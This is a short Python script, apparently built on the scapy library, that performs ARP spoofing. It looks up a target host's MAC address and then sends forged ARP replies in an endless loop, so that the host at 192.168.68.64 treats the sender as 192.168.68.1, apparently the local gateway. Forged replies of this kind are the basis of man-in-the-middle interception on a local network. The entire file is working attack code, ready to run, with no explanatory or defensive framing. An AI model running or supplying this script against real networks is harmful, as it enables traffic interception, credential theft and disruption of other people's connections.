from scapy.all import *

def MAC(target_ip):
    req = ARP(pdst = target_ip)
    broadcast = Ether(dst ="ff:ff:ff:ff:ff:ff")

    packet = broadcast / req
    ans = srp(packet, timeout = 5, verbose = False)[0]

    return ans[0][1].hwsrc

def ArpSpoof(target_ip, spoof_ip):
    while True:
        packet = ARP(op = 2, pdst = target_ip, hwdst = MAC(target_ip), psrc = spoof_ip)
        send(packet, verbose = False)


if __name__ == '__main__':
    ArpSpoof("192.168.68.64", "192.168.68.1")